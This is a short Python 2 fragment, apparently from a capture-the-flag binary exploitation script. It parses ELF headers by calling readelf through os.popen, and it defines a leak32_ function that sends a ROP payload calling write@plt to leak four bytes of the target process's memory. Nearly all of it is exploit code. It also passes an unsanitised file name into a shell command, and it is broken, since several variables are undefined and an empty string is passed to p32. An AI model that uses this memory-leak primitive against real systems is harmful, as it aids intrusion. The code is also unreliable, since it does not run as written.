
def readelf_h_(FileELF):
        r = os.popen('readelf -h {}'.format(FileELF))
        text = r.read()
        #print text     
        '''
        CLASS=re.findall("Class:[ ]{1,100}ELF[\d]{2}",text)
        CLASS=CLASS[0][-2:]
        print (CLASS)
        r.close()                   
        '''
        text=re.split('[\n]',text)
        head={}
        for i in text:
                print i
        text=text[1:-1]
        for i in text:
                a,b=(i.replace(' ','')).split(':')
                head[a]=b
        print head
        return head

def leak32_(address):
        next_func=''
        payload1=pppppppp+p32(write_plt)+p32(next_func)+p32(1)+p32(address)+p32(4)
        p.send(payload1)
        data=p.recv(4)
        return data

ELFHEAD_=readelf_h_('bcc471ee41b24f07bd285ab3a8d28907')
